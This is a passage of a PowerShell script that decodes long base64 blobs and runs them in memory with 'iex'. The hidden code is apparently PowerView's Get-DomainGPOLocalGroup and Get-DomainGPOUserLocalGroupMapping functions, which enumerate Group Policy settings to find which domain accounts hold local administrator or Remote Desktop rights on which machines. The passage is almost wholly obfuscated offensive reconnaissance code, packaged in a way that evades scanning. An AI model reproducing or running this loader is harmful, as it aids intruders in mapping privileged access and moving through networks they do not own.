nZlclRpbWVMaW1pdCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICRDb252ZXJ0QXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJENvbnZlcnRBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJENvbnZlcnRBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRDb252ZXJ0QXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgJFNwbGl0T3B0aW9uID0gW1N5c3RlbS5TdHJpbmdTcGxpdE9wdGlvbnNdOjpSZW1vdmVFbXB0eUVudHJpZXMKICAgIH0KICAgIFBST0NFU1MgewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0lkZW50aXR5J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJElkZW50aXR5IH0KICAgICAgICBHZXQtRG9tYWluR1BPIEBTZWFyY2hlckFyZ3VtZW50cyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgJEdQT2Rpc3BsYXlOYW1lID0gJF8uZGlzcGxheW5hbWUKICAgICAgICAgICAgJEdQT25hbWUgPSAkXy5uYW1lCiAgICAgICAgICAgICRHUE9QYXRoID0gJF8uZ3BjZmlsZXN5c3BhdGgKICAgICAgICAgICAgJFBhcnNlQXJncyA9ICBAeyAnR3B0VG1wbFBhdGgnID0gIiRHUE9QYXRoXE1BQ0hJTkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcU2VjRWRpdFxHcHRUbXBsLmluZiIgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFBhcnNlQXJnc1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICAgICAkSW5mID0gR2V0LUdwdFRtcGwgQFBhcnNlQXJncwogICAgICAgICAgICBpZiAoJEluZiAtYW5kICgkSW5mLnBzYmFzZS5LZXlzIC1jb250YWlucyAnR3JvdXAgTWVtYmVyc2hpcCcpKSB7CiAgICAgICAgICAgICAgICAkTWVtYmVyc2hpcHMgPSBAe30KICAgICAgICAgICAgICAgIEZvckVhY2ggKCRNZW1iZXJzaGlwIGluICRJbmYuJ0dyb3VwIE1lbWJlcnNoaXAnLkdldEVudW1lcmF0b3IoKSkgewogICAgICAgICAgICAgICAgICAgICRHcm91cCwgJFJlbGF0aW9uID0gJE1lbWJlcnNoaXAuS2V5LlNwbGl0KCdfXycsICRTcGxpdE9wdGlvbikgfCBGb3JFYWNoLU9iamVjdCB7JF8uVHJpbSgpfQogICAgICAgICAgICAgICAgICAgICRNZW1iZXJzaGlwVmFsdWUgPSAkTWVtYmVyc2hpcC5WYWx1ZSB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgeyAkXy5UcmltKCcqJykgfSB8IFdoZXJlLU9iamVjdCB7JF99CiAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzb2x2ZU1lbWJlcnNUb1NJRHMnXSkgewogICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBNZW1iZXJzID0gQCgpCiAgICAgICAgICAgICAgICAgICAgICAgIEZvckVhY2ggKCRNZW1iZXIgaW4gJE1lbWJlcnNoaXBWYWx1ZSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRNZW1iZXIgLWFuZCAoJE1lbWJlci5UcmltKCkgLW5lICcnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkTWVtYmVyIC1ub3RtYXRjaCAnXlMtMS0uKicpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJENvbnZlcnRUb0FyZ3VtZW50cyA9IEB7J09iamVjdE5hbWUnID0gJE1lbWJlcn0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJENvbnZlcnRUb0FyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlclNJRCA9IENvbnZlcnRUby1TSUQgQENvbnZlcnRUb0FyZ3VtZW50cwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJE1lbWJlclNJRCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwTWVtYmVycyArPSAkTWVtYmVyU0lECiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBNZW1iZXJzICs9ICRNZW1iZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwTWVtYmVycyArPSAkTWVtYmVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJzaGlwVmFsdWUgPSAkR3JvdXBNZW1iZXJzCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmICgtbm90ICRNZW1iZXJzaGlwc1skR3JvdXBdKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJzaGlwc1skR3JvdXBdID0gQHt9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmICgkTWVtYmVyc2hpcFZhbHVlIC1pc25vdCBbU3lzdGVtLkFycmF5XSkgeyRNZW1iZXJzaGlwVmFsdWUgPSBAKCRNZW1iZXJzaGlwVmFsdWUpfQogICAgICAgICAgICAgICAgICAgICRNZW1iZXJzaGlwc1skR3JvdXBdLkFkZCgkUmVsYXRpb24sICRNZW1iZXJzaGlwVmFsdWUpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBGb3JFYWNoICgkTWVtYmVyc2hpcCBpbiAkTWVtYmVyc2hpcHMuR2V0RW51bWVyYXRvcigpKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCRNZW1iZXJzaGlwIC1hbmQgJE1lbWJlcnNoaXAuS2V5IC1hbmQgKCRNZW1iZXJzaGlwLktleSAtbWF0Y2ggJ15cKicpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cFNJRCA9ICRNZW1iZXJzaGlwLktleS5UcmltKCcqJykKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRHcm91cFNJRCAtYW5kICgkR3JvdXBTSUQuVHJpbSgpIC1uZSAnJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cE5hbWUgPSBDb252ZXJ0RnJvbS1TSUQgLU9iamVjdFNJRCAkR3JvdXBTSUQgQENvbnZlcnRBcmd1bWVudHMKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cE5hbWUgPSAkRmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwTmFtZSA9ICRNZW1iZXJzaGlwLktleQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJEdyb3VwTmFtZSAtYW5kICgkR3JvdXBOYW1lLlRyaW0oKSAtbmUgJycpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJEdyb3VwbmFtZSAtbWF0Y2ggJ0FkbWluaXN0cmF0b3JzJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cFNJRCA9ICdTLTEtNS0zMi01NDQnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYgKCRHcm91cG5hbWUgLW1hdGNoICdSZW1vdGUgRGVza3RvcCcpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBTSUQgPSAnUy0xLTUtMzItNTU1JwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZWlmICgkR3JvdXBuYW1lIC1tYXRjaCAnR3Vlc3RzJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cFNJRCA9ICdTLTEtNS0zMi01NDYnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYgKCRHcm91cE5hbWUuVHJpbSgpIC1uZSAnJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRDb252ZXJ0VG9Bcmd1bWVudHMgPSBAeydPYmplY3ROYW1lJyA9ICRHcm91cG5hbWV9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJENvbnZlcnRUb0FyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBTSUQgPSBDb252ZXJ0VG8tU0lEIEBDb252ZXJ0VG9Bcmd1bWVudHMKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cFNJRCA9ICROdWxsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJEdQT0dyb3VwID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICRHUE9Hcm91cCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHUE9EaXNwbGF5TmFtZScgJEdQT0Rpc3BsYXlOYW1lCiAgICAgICAgICAgICAgICAgICAgJEdQT0dyb3VwIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dQT05hbWUnICRHUE9OYW1lCiAgICAgICAgICAgICAgICAgICAgJEdQT0dyb3VwIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dQT1BhdGgnICRHUE9QYXRoCiAgICAgICAgICAgICAgICAgICAgJEdQT0dyb3VwIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dQT1R5cGUnICdSZXN0cmljdGVkR3JvdXBzJwogICAgICAgICAgICAgICAgICAgICRHUE9Hcm91cCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdGaWx0ZXJzJyAkTnVsbAogICAgICAgICAgICAgICAgICAgICRHUE9Hcm91cCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cE5hbWUnICRHcm91cE5hbWUKICAgICAgICAgICAgICAgICAgICAkR1BPR3JvdXAgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR3JvdXBTSUQnICRHcm91cFNJRAogICAgICAgICAgICAgICAgICAgICRHUE9Hcm91cCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cE1lbWJlck9mJyAkTWVtYmVyc2hpcC5WYWx1ZS5NZW1iZXJvZgogICAgICAgICAgICAgICAgICAgICRHUE9Hcm91cCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cE1lbWJlcnMnICRNZW1iZXJzaGlwLlZhbHVlLk1lbWJlcnMKICAgICAgICAgICAgICAgICAgICAkR1BPR3JvdXAuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkdQT0dyb3VwJykKICAgICAgICAgICAgICAgICAgICAkR1BPR3JvdXAKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAkUGFyc2VBcmdzID0gIEB7CiAgICAgICAgICAgICAgICAnR3JvdXBzWE1McGF0aCcgPSAiJEdQT1BhdGhcTUFDSElORVxQcmVmZXJlbmNlc1xHcm91cHNcR3JvdXBzLnhtbCIKICAgICAgICAgICAgfQogICAgICAgICAgICBHZXQtR3JvdXBzWE1MIEBQYXJzZUFyZ3MgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXNvbHZlTWVtYmVyc1RvU0lEcyddKSB7CiAgICAgICAgICAgICAgICAgICAgJEdyb3VwTWVtYmVycyA9IEAoKQogICAgICAgICAgICAgICAgICAgIEZvckVhY2ggKCRNZW1iZXIgaW4gJF8uR3JvdXBNZW1iZXJzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkTWVtYmVyIC1hbmQgKCRNZW1iZXIuVHJpbSgpIC1uZSAnJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkTWVtYmVyIC1ub3RtYXRjaCAnXlMtMS0uKicpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkQ29udmVydFRvQXJndW1lbnRzID0gQHsnT2JqZWN0TmFtZScgPSAkR3JvdXBuYW1lfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRDb252ZXJ0VG9Bcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlclNJRCA9IENvbnZlcnRUby1TSUQgLURvbWFpbiAkRG9tYWluIC1PYmplY3ROYW1lICRNZW1iZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJE1lbWJlclNJRCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBNZW1iZXJzICs9ICRNZW1iZXJTSUQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cE1lbWJlcnMgKz0gJE1lbWJlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cE1lbWJlcnMgKz0gJE1lbWJlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRfLkdyb3VwTWVtYmVycyA9ICRHcm91cE1lbWJlcnMKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRfIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dQT0Rpc3BsYXlOYW1lJyAkR1BPRGlzcGxheU5hbWUKICAgICAgICAgICAgICAgICRfIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dQT05hbWUnICRHUE9OYW1lCiAgICAgICAgICAgICAgICAkXyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHUE9UeXBlJyAnR3JvdXBQb2xpY3lQcmVmZXJlbmNlcycKICAgICAgICAgICAgICAgICRfLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5HUE9Hcm91cCcpCiAgICAgICAgICAgICAgICAkXwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbkdQT1VzZXJMb2NhbEdyb3VwTWFwcGluZyB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5HUE9Vc2VyTG9jYWxHcm91cE1hcHBpbmcnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0Rpc3Rpbmd1aXNoZWROYW1lJywgJ1NhbUFjY291bnROYW1lJywgJ05hbWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRJZGVudGl0eSwKICAgICAgICBbU3RyaW5nXQogICAgICAgIFtWYWxpZGF0ZVNldCgnQWRtaW5pc3RyYXRvcnMnLCAnUy0xLTUtMzItNTQ0JywgJ1JEUCcsICdSZW1vdGUgRGVza3RvcCBVc2VycycsICdTLTEtNS0zMi01NTUnKV0KICAgICAgICAkTG9jYWxHcm91cCA9ICdBZG1pbmlzdHJhdG9ycycsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0FEU1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hCYXNlLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgQkVHSU4gewogICAgICAgICRDb21tb25Bcmd1bWVudHMgPSBAe30KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkQ29tbW9uQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRDb21tb25Bcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkQ29tbW9uQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRDb21tb25Bcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRDb21tb25Bcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJENvbW1vbkFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJENvbW1vbkFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgfQogICAgUFJPQ0VTUyB7CiAgICAgICAgJFRhcmdldFNJRHMgPSBAKCkKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydJZGVudGl0eSddKSB7CiAgICAgICAgICAgICRUYXJnZXRTSURzICs9IEdldC1Eb21haW5PYmplY3QgQENvbW1vbkFyZ3VtZW50cyAtSWRlbnRpdHkgJElkZW50aXR5IHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kIG9iamVjdHNpZAogICAgICAgICAgICAkVGFyZ2V0T2JqZWN0U0lEID0gJFRhcmdldFNJRHMKICAgICAgICAgICAgaWYgKC1ub3QgJFRhcmdldFNJRHMpIHsKICAgICAgICAgICAgICAgIFRocm93ICJbR2V0LURvbWFpbkdQT1VzZXJMb2NhbEdyb3VwTWFwcGluZ10gVW5hYmxlIHRvIHJldHJpZXZlIFNJRCBmb3IgaWRlbnRpdHkgJyRJZGVudGl0eSciCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRUYXJnZXRTSURzID0gQCgnKicpCiAgICAgICAgfQogICAgICAgIGlmICgkTG9jYWxHcm91cCAtbWF0Y2ggJ1MtMS01JykgewogICAgICAgICAgICAkVGFyZ2V0TG9jYWxTSUQgPSAkTG9jYWxHcm91cAogICAgICAgIH0KICAgICAgICBlbHNlaWYgKCRMb2NhbEdyb3VwIC1tYXRjaCAnQWRtaW4nKSB7CiAgICAgICAgICAgICRUYXJnZXRMb2NhbFNJRCA9ICdTLTEtNS0zMi01NDQnCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkVGFyZ2V0TG9jYWxTSUQgPSAnUy0xLTUtMzItNTU1JwogICAgICAgIH0KICAgICAgICBpZiAoJFRhcmdldFNJRHNbMF0gLW5lICcqJykgewogICAgICAgICAgICBGb3JFYWNoICgkVGFyZ2V0U2lkIGluICRUYXJnZXRTaWRzKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkdQT1VzZXJMb2NhbEdyb3VwTWFwcGluZ10gRW51bWVyYXRpbmcgbmVzdGVkIGdyb3VwIG1lbWJlcnNoaXBzIGZvcjogJyRUYXJnZXRTaWQnIgogICAgICAgICAgICAgICAgJFRhcmdldFNJRHMgKz0gR2V0LURvbWFpbkdyb3VwIEBDb21tb25Bcmd1bWVudHMgLVByb3BlcnRpZXMgJ29iamVjdHNpZCcgLU1lbWJlcklkZW50aXR5ICRUYXJnZXRTaWQgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBvYmplY3RzaWQKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkdQT1VzZXJMb2NhbEdyb3VwTWFwcGluZ10gVGFyZ2V0IGxvY2FsZ3JvdXAgU0lEOiAkVGFyZ2V0TG9jYWxTSUQiCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5HUE9Vc2VyTG9jYWxHcm91cE1hcHBpbmddIEVmZmVjdGl2ZSB0YXJnZXQgZG9tYWluIFNJRHM6ICRUYXJnZXRTSURzIgogICAgICAgICRHUE9ncm91cHMgPSBHZXQtRG9tYWluR1BPTG9jYWxHcm91cCBAQ29tbW9uQXJndW1lbnRzIC1SZXNvbHZlTWVtYmVyc1RvU0lEcyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgJEdQT2dyb3VwID0gJF8KICAgICAgICAgICAgaWYgKCRHUE9ncm91cC5Hcm91cFNJRCAtbWF0Y2ggJFRhcmdldExvY2FsU0lEKSB7CiAgICAgICAgICAgICAgICAkR1BPZ3JvdXAuR3JvdXBNZW1iZXJzIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCAoJFRhcmdldFNJRHNbMF0gLWVxICcqJykgLW9yICgkVGFyZ2V0U0lEcyAtQ29udGFpbnMgJF8pICkgewogICAgICAgICAgICAgICAgICAgICAgICAkR1BPZ3JvdXAKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCAoJEdQT2dyb3VwLkdyb3VwTWVtYmVyT2YgLWNvbnRhaW5zICRUYXJnZXRMb2NhbFNJRCkgKSB7CiAgICAgICAgICAgICAgICBpZiAoICgkVGFyZ2V0U0lEc1swXSAtZXEgJyonKSAtb3IgKCRUYXJnZXRTSURzIC1Db250YWlucyAkR1BPZ3JvdXAuR3JvdXBTSUQpICkgewogICAgICAgICAgICAgICAgICAgICRHUE9ncm91cAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfSB8IFNvcnQtT2JqZWN0IC1Qcm9wZXJ0eSBHUE9OYW1lIC1VbmlxdWUKICAgICAgICAkR1BPZ3JvdXBzIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICRHUE9uYW1lID0gJF8uR1BPRGlzcGxheU5hbWUKICAgICAgICAgICAgJEdQT2d1aWQgPSAkXy5HUE9OYW1lCiAgICAgICAgICAgICRHUE9QYXRoID0gJF8uR1BPUGF0aAogICAgICAgICAgICAkR1BPVHlwZSA9ICRfLkdQT1R5cGUKICAgICAgICAgICAgaWYgKCRfLkdyb3VwTWVtYmVycykgewogICAgICAgICAgICAgICAgJEdQT01lbWJlcnMgPSAkXy5Hcm91cE1lbWJlcnMKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRHUE9NZW1iZXJzID0gJF8uR3JvdXBTSUQKICAgICAgICAgICAgfQogICAgICAgICAgICAkRmlsdGVycyA9ICRfLkZpbHRlcnMKICAgICAgICAgICAgaWYgKCRUYXJnZXRTSURzWzBdIC1lcSAnKicpIHsKICAgICAgICAgICAgICAgICRUYXJnZXRPYmplY3RTSURzID0gJEdQT01lbWJlcnMKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRUYXJnZXRPYmplY3RTSURzID0gJFRhcmdldE9iamVjdFNJRAogICAgICAgICAgICB9CiAgICAgICAgICAgIEdldC1Eb21haW5PVSBAQ29tbW9uQXJndW1lbnRzIC1SYXcgLVByb3BlcnRpZXMgJ25hbWUsZGlzdGluZ3Vpc2hlZG5hbWUnIC1HUExpbmsgJEdQT0d1aWQgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICBpZiAoJEZpbHRlcnMpIHsKICAgICAgICAgICAgICAgICAgICAkT1VDb21wdXRlcnMgPSBHZXQtRG9tYWluQ29tcHV0ZXIgQENvbW1vbkFyZ3VtZW50cyAtUHJvcGVydGllcyAnZG5zaG9zdG5hbWUsZGlzdGluZ3Vpc2hlZG5hbWUnIC1TZWFyY2hCYXNlICRfLlBhdGggfCBXaGVyZS1PYmplY3QgeyRfLmRpc3Rpbmd1aXNoZWRuYW1lIC1tYXRjaCAoJEZpbHRlcnMuVmFsdWUpfSB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IGRuc2hvc3RuYW1lCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkT1VDb21wdXRlcnMgPSBHZXQtRG9tYWluQ29tcHV0ZXIgQ